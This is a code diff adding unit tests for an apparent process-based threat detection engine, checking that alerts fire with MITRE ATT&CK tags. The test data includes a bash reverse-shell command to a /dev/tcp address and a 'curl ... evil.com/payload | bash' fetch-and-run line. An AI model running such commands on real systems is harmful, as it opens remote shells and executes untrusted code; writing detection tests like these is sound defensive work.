@@ -48,3 +48,44 @@ def test_correlation_persistence_plus_running_process_escalates():
 def test_tc04_inaccessible_metadata_does_not_crash():
     p = proc(exe="", fd_readable=False)
     assert rules.evaluate([p], []) == []
+
+
+def test_siem_reverse_shell_detected():
+    p = proc(name="bash", exe="/bin/bash", cmdline=["bash", "-i", ">&", "/dev/tcp/10.0.0.1/4444", "0>&1"])
+    alerts = rules.evaluate([p], [])
+    assert len(alerts) == 1
+    assert alerts[0].severity == "Medium"
+    text = " ".join(alerts[0].reasons)
+    assert "REVERSE_SHELL_PATTERN" in text
+    assert "[MITRE T1059.004]" in text
+
+
+def test_siem_masquerading_detected():
+    p = proc(name="launchd", exe="/tmp/launchd", cmdline=["/tmp/launchd"])
+    alerts = rules.evaluate([p], [])
+    assert len(alerts) == 1
+    assert alerts[0].severity == "High"  # masquerading (3) + exec in temp (2) = 5
+    text = " ".join(alerts[0].reasons)
+    assert "PROCESS_MASQUERADING" in text
+    assert "[MITRE T1036.005]" in text
+
+
+def test_siem_deleted_executable_detected():
+    p = proc(name="malware", exe="/usr/local/bin/dropped (deleted)", cmdline=["dropped"])
+    alerts = rules.evaluate([p], [])
+    assert len(alerts) == 1
+    assert alerts[0].severity == "Low"  # 2 points
+    text = " ".join(alerts[0].reasons)
+    assert "DELETED_EXECUTABLE_RUNNING" in text
+    assert "[MITRE T1070.004]" in text
+
+
+def test_siem_obfuscated_command_detected():
+    p = proc(name="sh", exe="/bin/sh", cmdline=["sh", "-c", "curl -s http://evil.com/payload | bash"])
+    alerts = rules.evaluate([p], [])
+    assert len(alerts) == 1
+    assert alerts[0].severity == "Low"  # 2 points
+    text = " ".join(alerts[0].reasons)
+    assert "OBFUSCATED_COMMAND_EXECUTION" in text
+    assert "[MITRE T1027]" in text
+
